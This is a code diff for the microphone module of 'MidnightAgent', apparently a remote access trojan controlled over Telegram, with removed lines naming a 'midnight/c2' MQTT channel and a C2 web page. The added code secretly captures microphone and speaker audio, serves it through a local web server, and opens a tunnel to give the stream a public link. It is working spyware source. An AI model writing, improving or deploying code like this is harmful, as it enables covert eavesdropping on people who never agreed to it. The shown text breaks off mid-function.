@@ -1,17 +1,18 @@
 using System;
 using System.Collections.Generic;
-using System.Runtime.InteropServices;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Net.WebSockets;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
-using MidnightAgent.Core;
-using MidnightAgent.Telegram;
+using System.Diagnostics;
+using NAudio.Wave;
 using SIPSorcery.Net;
 using SIPSorceryMedia.Abstractions;
-using MQTTnet;
-using MQTTnet.Client;
-using MQTTnet.Protocol;
-using Newtonsoft.Json;
+using MidnightAgent.Core;
+using MidnightAgent.Telegram;
 
 namespace MidnightAgent.Features
 {
@@ -20,40 +21,44 @@ namespace MidnightAgent.Features
         public static TelegramService TelegramInstance { get; set; }
 
         public string Command => "mic";
-        public string Description => "Real-time WebRTC Audio (Optimized for 64kbps)";
-        public string Usage => "/mic start | /mic stop";
+        public string Description => "High-Quality Microphone & Speaker Streaming (Web Interface)";
+        public string Usage => "mic start | mic stop";
 
-        private static RTCPeerConnection _pc;
-        private static IMqttClient _mqttClient;
-        private static string _topicBase;
-        private static CustomWaveInAudioSource _audioSource;
-        private static SemaphoreSlim _lock = new SemaphoreSlim(1, 1);
+        private static HttpListener _listener;
+        private static WaveInEvent _waveIn;
+        private static WasapiLoopbackCapture _loopback;
+        private static int _port = 8080;
+        private static int _sampleRate = 16000;
+        private static float _smoothedGain = 1.0f;
+        private static readonly float _targetLevel = 28000f;
+        private static readonly float _maxBoost = 8.0f;
+        private static int _audioSource = 0; // 0: Mic, 1: Speaker, 2: Mixed
+        private static int _currentBitrate = 128;
+        private static DateTime _lastDataTime = DateTime.Now;
+        private static bool _isRestarting = false;
         private static bool _isRunning = false;
+        private static string _lastPort = "";
+        private static CancellationTokenSource _cts;
+        private static event Action<byte[]> OnAudioData;
+        private static Process _boreProcess;
 
         public async Task<FeatureResult> ExecuteAsync(string[] args)
         {
             if (args.Length == 0) return FeatureResult.Fail(Usage);
             string action = args[0].ToLower();
 
-            await _lock.WaitAsync();
-            try
+            if (action == "start")
             {
-                if (action == "stop")
-                {
-                    if (!_isRunning) return FeatureResult.Ok("⚠️ Not running.");
-                    await StopStreamingInternal();
-                    return FeatureResult.Ok("🛑 Stopped & Memory Released.");
-                }
-                if (action == "start")
-                {
-                    if (_isRunning) return FeatureResult.Fail("⚠️ Already running.");
-                    return await StartStreamingInternal();
-                }
+                if (_isRunning) return FeatureResult.Fail("⚠️ Microphone stream is already running.");
+                return await StartStreamingInternal();
             }
-            finally
+            else if (action == "stop")
             {
-                _lock.Release();
+                if (!_isRunning) return FeatureResult.Ok("⚠️ Microphone stream is not running.");
+                StopStreamingInternal();
+                return FeatureResult.Ok("🛑 Stopped & Cleanup complete.");
             }
+
             return FeatureResult.Fail(Usage);
         }
 
@@ -62,548 +67,473 @@ namespace MidnightAgent.Features
             try
             {
                 _isRunning = true;
-                string userId = Config.UserId;
-                _topicBase = $"midnight/c2/{userId}";
+                _cts = new CancellationTokenSource();
 
-                var factory = new MqttFactory();
-                _mqttClient = factory.CreateMqttClient();
-                
-                // 🛠️ ปรับจูน MQTT ให้ทนกับเน็ตช้าๆ แกว่งๆ
-                var options = new MqttClientOptionsBuilder()
-                    .WithTcpServer("broker.hivemq.com", 1883)
-                    .WithClientId($"MidnightAgent-{Guid.NewGuid()}")
-                    .WithCleanSession(true) 
-                    .WithKeepAlivePeriod(TimeSpan.FromSeconds(60)) // ยืดเวลา Keep Alive
-                    .WithTimeout(TimeSpan.FromSeconds(15)) // รอ Connection นานขึ้น
-                    .Build();
+                // 1. Initialize Audio Capture
+                StartRecording();
 
-                _mqttClient.ConnectedAsync += async e =>
-                {
-                    // 🛠️ ตั้ง Subscribe เป็น QoS 1 ฝั่งรับก็จะไม่พลาดข้อความเหมือนกัน
-                    var mqttFactory = new MqttFactory();
-                    var subscribeOptions = mqttFactory.CreateSubscribeOptionsBuilder()
-                        .WithTopicFilter($"{_topicBase}/call", MqttQualityOfServiceLevel.AtLeastOnce)
-                        .WithTopicFilter($"{_topicBase}/answer", MqttQualityOfServiceLevel.AtLeastOnce)
-                        .WithTopicFilter($"{_topicBase}/ice", MqttQualityOfServiceLevel.AtLeastOnce)
-                        .Build();
-                    await _mqttClient.SubscribeAsync(subscribeOptions, CancellationToken.None);
-                };
+                // 2. Start Web Server
+                _listener = new HttpListener();
+                // Try different ports if 8080 is taken
+                _port = FindAvailablePort(8080);
+                _listener.Prefixes.Add($"http://*:{_port}/");
+                _listener.Start();
 
-                _mqttClient.DisconnectedAsync += async e =>
-                {
-                    if (_isRunning)
-                    {
-                        await Task.Delay(TimeSpan.FromSeconds(5));
-                        try { await _mqttClient.ConnectAsync(options); } catch { }
+                // 3. Start Bore Tunnel
+                _ = Task.Run(() => StartBoreTunnel());
+                _ = Task.Run(() => HandleRequests(_cts.Token));
+
+                // 4. Watchdog for Audio
+                _ = Task.Run(async () => {
+                    while (!_cts.Token.IsCancellationRequested) {
+                        await Task.Delay(5000, _cts.Token);
+                        if ((DateTime.Now - _lastDataTime).TotalSeconds > 10 && !_isRestarting && _isRunning) {
+                            StartRecording();
+                        }
                     }
-                };
+                }, _cts.Token);
 
-                _mqttClient.ApplicationMessageReceivedAsync += HandleSignalingMessage;
-                await _mqttClient.ConnectAsync(options);
-
-                string url = $"https://midnightc2.netlify.app/listener?id={userId}";
                 string nick = NickFeature.GetNickname();
-                string display = string.IsNullOrEmpty(nick) ? userId : $"{userId} ({nick})";
-                
-                return FeatureResult.Ok($"🎙️ <b>WebRTC Ready! (64kbps Mode)</b>\nID: <code>{display}</code>\n🎧 <a href=\"{url}\"><b>Common Listen</b></a>");
+                string display = string.IsNullOrEmpty(nick) ? Config.UserId : $"{Config.UserId} ({nick})";
+
+                return FeatureResult.Ok($"🎙️ <b>Mic Feature Started!</b>\nAgent: <code>{display}</code>\n⏳ Waiting for public link...");
             }
             catch (Exception ex)
             {
-                await StopStreamingInternal();
+                StopStreamingInternal();
                 return FeatureResult.Fail($"❌ Error: {ex.Message}");
             }
         }
 
-        private async Task HandleSignalingMessage(MqttApplicationMessageReceivedEventArgs e)
-        {
-            // 1. ดึงข้อมูลออกมาก่อนเข้า Task.Run เพื่อป้องกัน MQTTnet recycle buffer
-            string topic = e.ApplicationMessage.Topic;
-            string payload = "";
-            if (e.ApplicationMessage.PayloadSegment.Array != null)
-            {
-                payload = Encoding.UTF8.GetString(e.ApplicationMessage.PayloadSegment.Array, e.ApplicationMessage.PayloadSegment.Offset, e.ApplicationMessage.PayloadSegment.Count);
-            }
-
-            _ = Task.Run(async () =>
-            {
-                try
-                {
-                    if (topic.EndsWith("/call"))
-                    {
-                        await _lock.WaitAsync();
-                        try { await CreatePeerConnection(); }
-                        finally { _lock.Release(); }
-
-                        var offer = _pc.createOffer(null);
-                        
-                        // 2. แทรกจำกัด Bandwidth หลังบรรทัด m=audio อย่างถูกต้องด้วย Regex
-                        offer.sdp = offer.sdp.Replace("b=AS:30\r\n", ""); 
-                        offer.sdp = System.Text.RegularExpressions.Regex.Replace(offer.sdp, @"(m=audio.*?\r\n)", "$1b=AS:400\r\n");
-
-                        await _pc.setLocalDescription(offer);
-                        await SendMqtt($"{_topicBase}/offer", offer.sdp);
-                    }
-                    else if (topic.EndsWith("/answer"))
-                    {
-                        if (_pc != null)
-                        {
-                            _pc.setRemoteDescription(new RTCSessionDescriptionInit { sdp = payload, type = RTCSdpType.answer });
-                            
-                            // 🛠️ คุยกับหน้าเว็บผ่าน Custom SDP Attribute เพื่อความแม่นยำ 100%
-                            bool isHighQuality = payload.Contains("a=x-quality:hd");
-                            
-                            if (_audioSource != null)
-                            {
-                                _audioSource.SetHighQualityMode(isHighQuality);
-                                Console.WriteLine($"[WebRTC] Answer received. Explicit Quality: {(isHighQuality ? "HD" : "Standard")}");
-                                TelegramInstance.SendMessage($"🎙️ <b>Status:</b> {(isHighQuality ? "HD Audio Mode (16kHz)" : "Standard Mode (8kHz)")}");
-                            }
-                        }
-                    }
-                    else if (topic.EndsWith("/ice"))
-                    {
-                        if (_pc != null && !string.IsNullOrEmpty(payload))
-                        {
-                            var ice = JsonConvert.DeserializeObject<RTCIceCandidateInit>(payload);
-                            if (ice != null) _pc.addIceCandidate(ice);
-                        }
-                    }
-                }
-                catch (Exception ex)
-                {
-                    // ปริ้นท์ Error ออกมาดู จะได้รู้ว่าพังตรงไหนเวลาเทส
-                    Console.WriteLine($"[WebRTC Error]: {ex.Message}\n{ex.StackTrace}");
-                }
-            });
-        }
-
-        private async Task CreatePeerConnection()
-        {
-             CleanupPeerConnection();
-
-             if (_audioSource != null)
-             {
-                 await _audioSource.CloseAudio();
-                 _audioSource = null;
-             }
-             _audioSource = new CustomWaveInAudioSource();
-
-             var config = new RTCConfiguration
-             {
-                 iceServers = new List<RTCIceServer> 
-                 { 
-                     // 🛠️ เพิ่ม STUN Server หลายๆ ตัว ช่วยลดอาการเชื่อมต่อไม่ติดจากปัญหา Network NAT
-                     new RTCIceServer { urls = "stun:stun.l.google.com:19302" },
-                     new RTCIceServer { urls = "stun:stun1.l.google.com:19302" },
-                     new RTCIceServer { urls = "stun:stun.cloudflare.com:3478" } 
-                 }
-             };
-             _pc = new RTCPeerConnection(config);
-
-             var pcmuFormat = new AudioFormat(SDPWellKnownMediaFormatsEnum.PCMU);
-             var l16Format = new AudioFormat(96, "L16", 16000); 
-             
-             var formats = new List<SDPAudioVideoMediaFormat> { 
-                 new SDPAudioVideoMediaFormat(l16Format),
-                 new SDPAudioVideoMediaFormat(pcmuFormat) 
-             };
-             
-             var audioTrack = new MediaStreamTrack(SDPMediaTypesEnum.audio, false, formats);
-             _pc.addTrack(audioTrack);
-
-             _audioSource.OnAudioSourceEncodedSample += _pc.SendAudio;
-             _audioSource.OnAudioSourceRawSample += (rate, duration, samples) => {
-                 if (_pc != null && _audioSource.IsHighQuality) 
-                 {
-                     // 🛠️ RTP L16 ต้องใช้ Big-Endian (Network Byte Order) 
-                     // แต่ Windows ใช้ Little-Endian เลยต้องสลับ Byte ก่อนส่ง
-                     byte[] bigEndianBytes = new byte[samples.Length * 2];
-                     for (int i = 0; i < samples.Length; i++)
-                     {
-                         bigEndianBytes[i * 2] = (byte)(samples[i] >> 8);
-                         bigEndianBytes[i * 2 + 1] = (byte)(samples[i] & 0xFF);
-                     }
-                     _pc.SendAudio((uint)bigEndianBytes.Length, bigEndianBytes);
-                 }
-             };
-             // จะไป StartAudio จริงๆ เมื่อ OnConnectionStateChange เป็น connected เท่านั้น เพื่อไม่ให้ขึ้นรูปไมค์ค้าง
-             // await _audioSource.StartAudio(); 
-
-             _pc.onicecandidate += OnIceCandidate;
-             _pc.onconnectionstatechange += OnConnectionStateChange;
-        }
-
-        private void OnIceCandidate(RTCIceCandidate candidate)
-        {
-             if (candidate != null)
-             {
-                 var iceJson = JsonConvert.SerializeObject(new { candidate = candidate.candidate, sdpMid = candidate.sdpMid, sdpMLineIndex = candidate.sdpMLineIndex });
-                 _ = SendMqtt($"{_topicBase}/ice_agent", iceJson);
-             }
-        }
-
-        private void OnConnectionStateChange(RTCPeerConnectionState state)
-        {
-            if (state == RTCPeerConnectionState.connected) {
-                TelegramInstance.SendMessage("✅ <b>Connected!</b>");
-                _ = Task.Run(async () => {
-                    if (_audioSource != null) await _audioSource.StartAudio();
-                });
-            }
-
-            if (state == RTCPeerConnectionState.disconnected || state == RTCPeerConnectionState.failed || state == RTCPeerConnectionState.closed)
-            {
-                _ = Task.Run(async () =>
-                {
-                    await _lock.WaitAsync();
-                    try
-                    {
-                        if (_audioSource != null)
-                        {
-                            await _audioSource.CloseAudio();
-                            _audioSource = null;
-                        }
-                        CleanupPeerConnection();
-                    }
-                    catch { }
-                    finally
-                    {
-                        _lock.Release();
-                    }
-                });
-            }
-        }
-
-        private void CleanupPeerConnection()
-        {
-            if (_pc != null)
-            {
-                _pc.onicecandidate -= OnIceCandidate;
-                _pc.onconnectionstatechange -= OnConnectionStateChange;
-                
-                _pc.Close("stop");
-                _pc.Dispose();
-                _pc = null;
-            }
-        }
-
-        private async Task SendMqtt(string topic, string payload)
-        {
-            if (_mqttClient != null && _mqttClient.IsConnected)
-            {
-                // 🛠️ เปลี่ยนเป็น AtLeastOnce (QoS 1) ข้อมูลจะไม่หายกลางทางเมื่อเน็ตแกว่ง
-                var msg = new MqttApplicationMessageBuilder()
-                    .WithTopic(topic)
-                    .WithPayload(payload)
-                    .WithQualityOfServiceLevel(MqttQualityOfServiceLevel.AtLeastOnce) 
-                    .Build();
-                await _mqttClient.PublishAsync(msg);
-            }
-        }
-
-        private async Task StopStreamingInternal()
+        private void StopStreamingInternal()
         {
             _isRunning = false;
+            _cts?.Cancel();
 
-            if (_audioSource != null)
-            {
-                if (_pc != null) _audioSource.OnAudioSourceEncodedSample -= _pc.SendAudio;
-                await _audioSource.CloseAudio();
-                _audioSource = null;
-            }
+            try { _waveIn?.StopRecording(); _waveIn?.Dispose(); } catch { }
+            try { _loopback?.StopRecording(); _loopback?.Dispose(); } catch { }
+            try { _listener?.Stop(); _listener?.Close(); } catch { }
+            try { if (_boreProcess != null && !_boreProcess.HasExited) _boreProcess.Kill(); } catch { }
 
-            CleanupPeerConnection();
-
-            if (_mqttClient != null)
-            {
-                _mqttClient.ApplicationMessageReceivedAsync -= HandleSignalingMessage;
-                await _mqttClient.DisconnectAsync();
-                _mqttClient.Dispose();
-                _mqttClient = null;
-            }
-            
-            GC.Collect(2, GCCollectionMode.Forced);
-            GC.WaitForPendingFinalizers();
-            GC.Collect(2, GCCollectionMode.Forced);
-            
-            try { SetProcessWorkingSetSize(System.Diagnostics.Process.GetCurrentProcess().Handle, -1, -1); } catch { }
+            _waveIn = null;
+            _loopback = null;
+            _listener = null;
+            _boreProcess = null;
+            _lastPort = "";
         }
 
-        [DllImport("kernel32.dll")]
-        static extern bool SetProcessWorkingSetSize(IntPtr hProcess, int dwMinimumWorkingSetSize, int dwMaximumWorkingSetSize);
-    }
-
-    public class CustomWaveInAudioSource : IAudioSource
-    {
-        public event EncodedSampleDelegate OnAudioSourceEncodedSample;
-        public event Action<EncodedAudioFrame> OnAudioSourceEncodedFrameReady;
-        public event RawAudioSampleDelegate OnAudioSourceRawSample;
-        public event SourceErrorDelegate OnAudioSourceError;
-
-        private WaveInRecorder _recorder;
-        private double _currentGain = 1.0;
-        private const double TargetAmplitude = 18000.0;
-        private const double MaxGain = 12.0;
-
-        private int _silenceHangover = 0;
-        private const int HangoverLimit = 15;
-        public bool IsHighQuality { get; private set; } = false;
-
-        public CustomWaveInAudioSource()
+        private int FindAvailablePort(int startPort)
         {
-            _recorder = new WaveInRecorder(OnWaveInData);
-        }
-        
-        public void SetHighQualityMode(bool highQuality)
-        {
-            IsHighQuality = highQuality;
-        }
-
-        public Task StartAudio()
-        {
-            _recorder.Start();
-            return Task.CompletedTask;
-        }
-
-        public Task CloseAudio()
-        {
-            _recorder.Stop(); 
-            return Task.CompletedTask;
-        }
-
-        public Task PauseAudio() => Task.CompletedTask;
-        public Task ResumeAudio() => Task.CompletedTask;
-        public List<AudioFormat> GetAudioSourceFormats() => new List<AudioFormat> { new AudioFormat(SDPWellKnownMediaFormatsEnum.PCMU) };
-        public void SetAudioSourceFormat(AudioFormat audioFormat) { }
-        public void RestrictFormats(Func<AudioFormat, bool> filter) { }
-        public void ExternalAudioSourceRawSample(AudioSamplingRatesEnum samplingRate, uint durationMilliseconds, short[] sample) { }
-        public bool HasEncodedAudioSubscribers() => OnAudioSourceEncodedSample != null;
-        public bool IsAudioSourcePaused() => false;
-
-        private void OnWaveInData(byte[] pcmData)
-        {
-            // 🛠️ Auto-Gain Logic (AGC)
-            short[] samples = new short[pcmData.Length / 2];
-            int maxAbs = 0;
-
-            for (int i = 0; i < pcmData.Length; i += 2)
-            {
-                short s = BitConverter.ToInt16(pcmData, i);
-                samples[i / 2] = s;
-                int abs = Math.Abs((int)s);
-                if (abs > maxAbs) maxAbs = abs;
-            }
-
-            if (maxAbs > 30) // ป้องกันการขยายเสียงซ่าไฟฟ้า (Noise Floor)
-            {
-                double targetGain = TargetAmplitude / maxAbs;
-                if (targetGain > MaxGain) targetGain = MaxGain;
-                if (targetGain < 1.0) targetGain = 1.0;
-
-                // Smoothing: ปลดเนียนๆ ไม่ให้เสียงวูบวาบ
-                if (targetGain < _currentGain)
-                    _currentGain = _currentGain * 0.6 + targetGain * 0.4; // ลดเร็วเมื่อเจอเสียงดัง
-                else
-                    _currentGain = _currentGain * 0.98 + targetGain * 0.02; // ค่อยๆ เพิ่มเมื่อเสียงเบา
-            }
-
-            if (maxAbs < 20) // ปรับ Threshold ต่ำลงอีกสำหรับเสียงตัว s
-            {
-                if (_silenceHangover > 0) _silenceHangover--;
-                else return;
-            }
-            else
-            {
-                _silenceHangover = HangoverLimit;
-            }
-
-            // Apply Gain
-            for (int i = 0; i < samples.Length; i++)
-            {
-                double val = samples[i] * _currentGain;
-                if (val > 32767) val = 32767;
-                else if (val < -32768) val = -32768;
-                samples[i] = (short)val;
-            }
-
-            if (IsHighQuality)
-            {
-                // Send Raw L16 (PCM) 16kHz
-                OnAudioSourceRawSample?.Invoke((AudioSamplingRatesEnum)16000, 100, samples);
-            }
-            else
-            {
-                // Send PCMU: ต้อง Downsample จาก 16kHz เป็น 8kHz (หยิบค่าเว้นค่า)
-                byte[] downsampledPcm = new byte[(samples.Length / 2) * 2];
-                for (int i = 0; i < samples.Length / 2; i++) {
-                    short s = samples[i * 2];
-                    downsampledPcm[i * 2] = (byte)(s & 0xFF);
-                    downsampledPcm[i * 2 + 1] = (byte)((s >> 8) & 0xFF);
-                }
-                byte[] encoded = MuLawEncoder.Encode(downsampledPcm);
-                OnAudioSourceEncodedSample?.Invoke((uint)encoded.Length, encoded);
-            }
-        }
-    }
-
-    public static class MuLawEncoder
-    {
-        public static byte[] Encode(byte[] pcmData)
-        {
-            byte[] encoded = new byte[pcmData.Length / 2];
-            int outIndex = 0;
-            for (int i = 0; i < pcmData.Length; i += 2)
-            {
-                encoded[outIndex++] = LinearToMuLaw(BitConverter.ToInt16(pcmData, i));
-            }
-            return encoded;
-        }
-        private static byte LinearToMuLaw(short sample)
-        {
-            const int BIAS = 0x84;
-            const int CLIP = 32635;
-            int sign = (sample >> 8) & 0x80;
-            if (sample < 0) sample = (short)-sample;
-            if (sample > CLIP) sample = CLIP;
-            sample = (short)(sample + BIAS);
-            int exponent = 7;
-            for (int expMask = 0x4000; (sample & expMask) == 0 && exponent > 0; exponent--, expMask >>= 1) { }
-            int mantissa = (sample >> (exponent + 3)) & 0x0F;
-            byte mulaw = (byte)(sign | (exponent << 4) | mantissa);
-            return (byte)~mulaw;
-        }
-    }
-
-    public class WaveInRecorder : IDisposable
-    {
-        [DllImport("winmm.dll")] private static extern int waveInOpen(out IntPtr hWaveIn, int uDeviceID, ref WAVEFORMATEX lpFormat, WaveDelegate dwCallback, IntPtr dwInstance, int dwFlags);
-        [DllImport("winmm.dll")] private static extern int waveInPrepareHeader(IntPtr hWaveIn, IntPtr lpWaveHdr, int uSize);
-        [DllImport("winmm.dll")] private static extern int waveInUnprepareHeader(IntPtr hWaveIn, IntPtr lpWaveHdr, int uSize);
-        [DllImport("winmm.dll")] private static extern int waveInAddBuffer(IntPtr hWaveIn, IntPtr lpWaveHdr, int uSize);
-        [DllImport("winmm.dll")] private static extern int waveInStart(IntPtr hWaveIn);
-        [DllImport("winmm.dll")] private static extern int waveInStop(IntPtr hWaveIn);
-        [DllImport("winmm.dll")] private static extern int waveInReset(IntPtr hWaveIn);
-        [DllImport("winmm.dll")] private static extern int waveInClose(IntPtr hWaveIn);
-
-        private delegate void WaveDelegate(IntPtr hWaveIn, int uMsg, IntPtr dwInstance, IntPtr dwParam1, IntPtr dwParam2);
-        private WaveDelegate _waveDelegate; 
-
-        [StructLayout(LayoutKind.Sequential)] public struct WAVEFORMATEX { public short wFormatTag; public short nChannels; public int nSamplesPerSec; public int nAvgBytesPerSec; public short nBlockAlign; public short wBitsPerSample; public short cbSize; }
-        [StructLayout(LayoutKind.Sequential)] public struct WAVEHDR { public IntPtr lpData; public int dwBufferLength; public int dwBytesRecorded; public IntPtr dwUser; public int dwFlags; public int dwLoops; public IntPtr lpNext; public IntPtr reserved; }
-
-        private const int MM_WIM_DATA = 0x3C0;
-        private IntPtr _hWaveIn;
-        private Action<byte[]> _callback;
-        private bool _recording = false;
-        private List<IntPtr> _headers = new List<IntPtr>();
-        
-        // 🛠️ ปรับ Buffer จาก 60ms เป็น 100ms เพื่อความเสถียรและประหยัด Overhead
-        // 8kHz 16bit: 1 วินาที = 16000 bytes -> 100ms = 1600 bytes
-        private const int BUFFER_SIZE = 1600; 
-        private const int NUM_BUFFERS = 5; // เพิ่ม Buffer สำรองช่วยเรื่องเน็ตแกว่ง
-
-        public WaveInRecorder(Action<byte[]> callback)
-        {
-            _callback = callback;
-        }
-
-        public void Start()
-        {
-            if (_recording) return;
-
-            WAVEFORMATEX fmt = new WAVEFORMATEX();
-            fmt.wFormatTag = 1; // PCM
-            fmt.nChannels = 1; 
-            fmt.nSamplesPerSec = 16000; // อัปเกรดเป็น 16kHz เพื่อให้ได้เสียงตัว s ชัดขึ้น
-            fmt.wBitsPerSample = 16;
-            fmt.nBlockAlign = (short)(fmt.nChannels * fmt.wBitsPerSample / 8); 
-            fmt.nAvgBytesPerSec = fmt.nSamplesPerSec * fmt.nBlockAlign; 
-            fmt.cbSize = 0;
-
-            _waveDelegate = new WaveDelegate(WaveInProc);
-            int res = waveInOpen(out _hWaveIn, -1, ref fmt, _waveDelegate, IntPtr.Zero, 0x00030000); 
-            if (res != 0) return;
-
-            // 100ms ของ 16kHz 16-bit = 16000 * 0.1 * 2 = 3200 bytes
-            const int EFFECTIVE_BUFFER_SIZE = 3200;
-
-            for (int i = 0; i < NUM_BUFFERS; i++)
-            {
-                WAVEHDR hdr = new WAVEHDR();
-                hdr.dwBufferLength = EFFECTIVE_BUFFER_SIZE;
-                hdr.lpData = Marshal.AllocHGlobal(EFFECTIVE_BUFFER_SIZE);
-                
-                IntPtr pHdr = Marshal.AllocHGlobal(Marshal.SizeOf(hdr));
-                Marshal.StructureToPtr(hdr, pHdr, false);
-                
-                waveInPrepareHeader(_hWaveIn, pHdr, Marshal.SizeOf(hdr));
-                waveInAddBuffer(_hWaveIn, pHdr, Marshal.SizeOf(hdr));
-                _headers.Add(pHdr);
-            }
-
-            waveInStart(_hWaveIn);
-            _recording = true;
-        }
-
-        private void WaveInProc(IntPtr hWaveIn, int uMsg, IntPtr dwInstance, IntPtr dwParam1, IntPtr dwParam2)
-        {
-            if (uMsg == MM_WIM_DATA && _recording)
+            int port = startPort;
+            while (port < startPort + 10)
             {
                 try
                 {
-                    WAVEHDR hdr = (WAVEHDR)Marshal.PtrToStructure(dwParam1, typeof(WAVEHDR));
-                    if (hdr.dwBytesRecorded > 0)
+                    var l = new System.Net.Sockets.TcpListener(IPAddress.Any, port);
+                    l.Start();
+                    l.Stop();
+                    return port;
+                }
+                catch { port++; }
+            }
+            return new Random().Next(10000, 60000);
+        }
+
+        private static void StartRecording()
+        {
+            if (_isRestarting || !_isRunning) return;
+            _isRestarting = true;
+            try {
+                if (_waveIn != null) { try { _waveIn.StopRecording(); _waveIn.Dispose(); } catch { } }
+                if (_loopback != null) { try { _loopback.StopRecording(); _loopback.Dispose(); } catch { } }
+                Thread.Sleep(500); 
+            } catch { }
+
+            _sampleRate = _currentBitrate * 1000 / 8;
+
+            try {
+                _waveIn = new WaveInEvent { WaveFormat = new WaveFormat(_sampleRate, 16, 1), BufferMilliseconds = 30 };
+                _waveIn.DataAvailable += (s, e) => {
+                    try { if (_audioSource == 0 || _audioSource == 2) ProcessAndSend(e.Buffer, e.BytesRecorded, true); } catch { }
+                };
+                _waveIn.RecordingStopped += (s, e) => { if (!_isRestarting && _isRunning && e.Exception != null) StartRecording(); };
+
+                _loopback = new WasapiLoopbackCapture();
+                _loopback.DataAvailable += (s, e) => {
+                    try { if (_audioSource == 1 || _audioSource == 2) ProcessLoopback(e.Buffer, e.BytesRecorded); } catch { }
+                };
+                _loopback.RecordingStopped += (s, e) => { if (!_isRestarting && _isRunning && e.Exception != null) StartRecording(); };
+
+                _waveIn.StartRecording();
+                _loopback.StartRecording();
+                _lastDataTime = DateTime.Now;
+            } catch (Exception ex) {
+                Logger.Log($"[Audio Error] Failed to start: {ex.Message}");
+            }
+            _isRestarting = false;
+        }
+
+        private static void ProcessLoopback(byte[] buffer, int bytesRecorded)
+        {
+            int channels = _loopback.WaveFormat.Channels;
+            int samples = bytesRecorded / (4 * channels);
+            byte[] pcmBuffer = new byte[samples * 2];
+
+            for (int i = 0; i < samples; i++)
+            {
+                float left = BitConverter.ToSingle(buffer, i * 4 * channels);
+                float right = channels > 1 ? BitConverter.ToSingle(buffer, i * 4 * channels + 4) : left;
+                float mixed = (left + right) / 2f;
+                short sample = (short)(mixed * 32767);
+                byte[] bytes = BitConverter.GetBytes(sample);
+                pcmBuffer[i * 2] = bytes[0];
+                pcmBuffer[i * 2 + 1] = bytes[1];
+            }
+            ProcessAndSend(pcmBuffer, pcmBuffer.Length, false);
+        }
+
+        private static void ProcessAndSend(byte[] buffer, int bytesRecorded, bool isMic)
+        {
+            float gain = 1.0f;
+            if (isMic)
+            {
+                short maxAbs = 0;
+                for (int i = 0; i < bytesRecorded; i += 2)
+                {
+                    short abs = Math.Abs(BitConverter.ToInt16(buffer, i));
+                    if (abs > maxAbs) maxAbs = abs;
+                }
+                if (maxAbs > 100)
+                {
+                    float idealGain = _targetLevel / maxAbs;
+                    if (idealGain > _maxBoost) idealGain = _maxBoost;
+                    _smoothedGain = (_smoothedGain * 0.9f) + (idealGain * 0.1f);
+                }
+                gain = _smoothedGain;
+            }
+
+            byte[] muLawBuffer = new byte[bytesRecorded / 2];
+            for (int i = 0; i < bytesRecorded; i += 2)
+            {
+                short pcm = BitConverter.ToInt16(buffer, i);
+                if (isMic) pcm = (short)Math.Max(-32768, Math.Min(32767, pcm * gain));
+                muLawBuffer[i / 2] = NAudio.Codecs.MuLawEncoder.LinearToMuLawSample(pcm);
+            }
+            _lastDataTime = DateTime.Now;
+            OnAudioData?.Invoke(muLawBuffer);
+        }
+
+        private async Task HandleRequests(CancellationToken token)
+        {
+            while (!token.IsCancellationRequested && _listener.IsListening)
+            {
+                try
+                {
+                    var context = await _listener.GetContextAsync();
+                    var req = context.Request;
+                    var res = context.Response;
+
+                    if (req.IsWebSocketRequest)
                     {
-                        byte[] buf = new byte[hdr.dwBytesRecorded];
-                        Marshal.Copy(hdr.lpData, buf, 0, hdr.dwBytesRecorded);
-                        _callback?.Invoke(buf);
+                        _ = Task.Run(async () => {
+                            try {
+                                HttpListenerWebSocketContext wsContext = await context.AcceptWebSocketAsync(null);
+                                var ws = wsContext.WebSocket;
+                                var sendQueue = new System.Collections.Concurrent.BlockingCollection<byte[]>();
+                                
+                                _ = Task.Run(async () => {
+                                    try {
+                                        foreach (var data in sendQueue.GetConsumingEnumerable(token)) {
+                                            if (ws.State != WebSocketState.Open) break;
+                                            await ws.SendAsync(new ArraySegment<byte>(data), WebSocketMessageType.Binary, true, CancellationToken.None);
+                                        }
+                                    } catch { }
+                                }, token);
+
+                                Action<byte[]> handler = (data) => { try { sendQueue.Add(data); } catch { } };
+                                OnAudioData += handler;
+                                while (ws.State == WebSocketState.Open && !token.IsCancellationRequested) await Task.Delay(1000);
+                                OnAudioData -= handler;
+                                sendQueue.CompleteAdding();
+                            } catch { }
+                        }, token);
                     }
-                    if (_recording)
+                    else if (req.HttpMethod == "POST" && req.Url.AbsolutePath == "/offer")
                     {
-                        waveInAddBuffer(hWaveIn, dwParam1, Marshal.SizeOf(hdr));
+                        _ = Task.Run(async () => {
+                            try {
+                                string offerSdp = new StreamReader(req.InputStream).ReadToEnd();
+                                var pc = new RTCPeerConnection(new RTCConfiguration {
+                                    iceServers = new List<RTCIceServer> {
+                                        new RTCIceServer { urls = "stun:stun.l.google.com:19302" },
+                                        new RTCIceServer { urls = "stun:stun1.l.google.com:19302" }
+                                    }
+                                });
+                                _ = pc.createDataChannel("signaling");
+                                pc.setRemoteDescription(new RTCSessionDescriptionInit { type = RTCSdpType.offer, sdp = offerSdp });
+                                var answer = pc.createAnswer();
+                                _ = pc.setLocalDescription(answer);
+                                var iceWait = new ManualResetEvent(false);
+                                pc.onicegatheringstatechange += (state) => { if (state == RTCIceGatheringState.complete) iceWait.Set(); };
+                                iceWait.WaitOne(2000);
+                                byte[] buffer = Encoding.UTF8.GetBytes(pc.localDescription.sdp.ToString().Replace("a=setup:actpass", "a=setup:passive"));
+                                res.ContentType = "text/plain"; res.OutputStream.Write(buffer, 0, buffer.Length); res.Close();
+                            } catch { }
+                        }, token);
+                    }
+                    else if (req.HttpMethod == "GET" && req.Url.AbsolutePath == "/source")
+                    {
+                        string sourceStr = req.QueryString["id"];
+                        if (int.TryParse(sourceStr, out int src))
+                        {
+                            _audioSource = src;
+                        }
+                        res.StatusCode = 200; res.Close();
+                    }
+                    else if (req.HttpMethod == "GET" && req.Url.AbsolutePath == "/bitrate")
+                    {
+                        if (int.TryParse(req.QueryString["val"], out int br))
+                        {
+                            _currentBitrate = br;
+                            StartRecording();
+                        }
+                        res.StatusCode = 200; res.Close();
+                    }
+                    else
+                    {
+                        string html = GetIndexHtml();
+                        byte[] buffer = Encoding.UTF8.GetBytes(html);
+                        res.ContentType = "text/html"; res.OutputStream.Write(buffer, 0, buffer.Length); res.Close();
                     }
                 }
                 catch { }
             }
         }
 
-        public void Stop()
+        private void StartBoreTunnel()
         {
-            if (!_recording) return;
-            _recording = false;
-            
-            try 
-            {
-                waveInReset(_hWaveIn);
-                waveInClose(_hWaveIn);
-            } 
